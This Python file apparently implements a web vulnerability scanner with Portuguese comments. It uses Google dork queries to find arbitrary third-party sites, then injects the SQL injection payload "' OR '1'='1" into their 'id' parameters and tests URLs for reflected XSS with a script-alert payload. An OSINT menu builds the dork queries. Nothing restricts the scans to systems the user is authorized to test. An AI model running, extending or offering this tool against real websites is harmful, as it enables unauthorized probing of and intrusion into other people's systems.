from googlesearch import search
import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
from bs4 import BeautifulSoup



class WebVulnerabilityScanner:
    def __init__(self, user_agent="Mozilla/5.0"):
        """
        Inicializa o scanner de vulnerabilidades web.

        :param user_agent: User-Agent a ser usado nas requisições HTTP.
        """
        self.user_agent = user_agent

    def google_dork_search(self, dork, num_results=10):
        """
        Realiza uma pesquisa no Google usando uma dork.

        :param dork: A dork a ser pesquisada (ex: 'inurl:admin.php').
        :param num_results: Número de resultados a serem retornados.
        :return: Lista de URLs encontrados.
        """
        try:
            # Configurações da requisição
            headers = {"User-Agent": self.user_agent}
            url = f"https://www.google.com/search?q={dork}&num={num_results}"
            response = requests.get(url, headers=headers)

            # Verifica se a requisição foi bem-sucedida
            if response.status_code != 200:
                print(f"Erro ao acessar o Google: Código {response.status_code}")
                return []

            # Parseia o conteúdo da página
            soup = BeautifulSoup(response.text, "html.parser")
            links = []

            # Busca a div que contém os resultados (com data-async-context)
            results_div = soup.find("div", {"data-async-context": True})
            if not results_div:
                print("Div de resultados não encontrada.")
                return []

            # Busca por spans que contenham links (<a> com href)
            for span in results_div.find_all("span"):
                link_element = span.find("a", href=True)  # Procura por <a> com href dentro do span
                if link_element:
                    link = link_element["href"]
                    if link.startswith("/url?q="):  # Verifica se é um link do Google
                        link = link[7:]  # Remove o prefixo
                        link = link.split("&")[0]  # Remove parâmetros adicionais
                        links.append(link)

            return links
        except Exception as e:
            print(f"Erro ao realizar a pesquisa: {e}")
            return []

    def check_sql_injection(self, url):
        # Parse the original URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Add or modify the 'id' parameter with SQL payload
        params['id'] = ["' OR '1'='1"]
        new_query = urlencode(params, doseq=True)

        # Rebuild the URL
        rebuilt_url = urlunparse(parsed._replace(query=new_query))

        # Make the request (using requests.get as before)
        response = requests.get(rebuilt_url, headers={"User-Agent": "Mozilla/5.0"})
        return "SQL syntax" in response.text

    def scan_with_dorks(self, dork, num_results=10):
        """
        Escaneia sites encontrados com uma dork em busca de vulnerabilidades.

        :param dork: A dork a ser pesquisada.
        :param num_results: Número de resultados a serem verificados.
        :return: Lista de URLs vulneráveis.
        """
        vulnerable_urls = []
        urls = self.google_dork_search(dork, num_results)

        for url in urls:
            print(f"Verificando {url}...")
            if self.check_sql_injection(url):
                print(f"Vulnerabilidade encontrada em: {url}")
                vulnerable_urls.append(url)

        return vulnerable_urls

    def check_xss(self, url):
        """
        Verifica se uma URL é vulnerável a XSS.

        :param url: A URL a ser verificada.
        :return: True se vulnerável, False caso contrário.
        """
        try:
            # Adiciona um payload de XSS à URL
            payload = "<script>alert('XSS')</script>"
            test_url = f"{url}?q={payload}"

            # Faz a requisição HTTP
            headers = {"User-Agent": self.user_agent}
            response = requests.get(test_url, headers=headers)

            # Verifica se o payload foi refletido na resposta
            if payload in response.text:
                return True
            return False
        except Exception as e:
            print(f"Erro ao verificar XSS: {e}")
            return False

    def osint_search(self):
        """
        Realiza uma busca OSINT com base em dorks selecionadas pelo usuário.
        """
        # Pergunta ao usuário o termo de busca
        search_term = input("Digite o termo que deseja buscar: ")

        # Lista de dorks disponíveis
        dorks = {
            "1": f"inurl:{search_term}",
            "2": f"intext:{search_term}",
            "3": f"intitle:{search_term}",
            "4": f"filetype:pdf {search_term}",
            "5": f"site:{search_term}",
            "6": f"ext:php {search_term}",
            "7": f"cache:{search_term}",
            "8": f"link:{search_term}",
            "9": f"related:{search_term}",
            "10": f"info:{search_term}"
        }

        # Exibe as opções de dorks
        print("Escolha as dorks que deseja usar (separadas por vírgula):")
        for key, value in dorks.items():
            print(f"{key}: {value}")

        # Recebe as escolhas do usuário
        choices = input("Digite os números das dorks que deseja usar (ex: 1,2,3): ")
        selected_dorks = [dorks[choice.strip()] for choice in choices.split(",") if choice.strip() in dorks]

        # Realiza a busca para cada dork selecionada
        for dork in selected_dorks:
            print(f"\nRealizando busca com a dork: {dork}")
            results = self.google_dork_search(dork)
            for result in results:
                print(f"Resultado encontrado: {result}")